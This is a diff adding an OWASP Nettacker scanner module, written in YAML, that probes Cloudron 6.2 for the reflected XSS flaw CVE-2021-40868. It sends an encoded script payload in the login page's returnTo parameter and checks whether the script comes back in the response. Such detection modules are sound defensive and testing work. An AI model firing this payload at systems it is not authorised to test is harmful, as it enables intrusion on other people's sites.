@@ -1,0 +1,55 @@
+info:
+  name: cloudron_cve_2021_40868_vuln
+  author: OWASP Nettacker Team
+  severity: 5
+  description: In Cloudron 6.2, the returnTo parameter on the login page is vulnerable to Reflected XSS.
+  reference: 
+    - https://packetstormsecurity.com/files/164255/Cloudron-6.2-Cross-Site-Scripting.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-40868
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - medium_severity
+    - cve2021
+    - cve
+    - cloudron
+    - xss
+
+payloads:
+  - library: http
+    verify: false
+    timeout: 3
+    cert: ""
+    stream: false
+    proxies: ""
+    steps:
+      - method: get
+        headers:
+          User-Agent: "{user_agent}"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/login.html?returnTo=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status:
+              regex: 200
+              reverse: false
+            header:
+              Content-type: 
+                regex: text/html
+                reverse: false  
+            content:
+              regex: <\/script><script>alert\(document.domain\)<\/script>
+              reverse: false
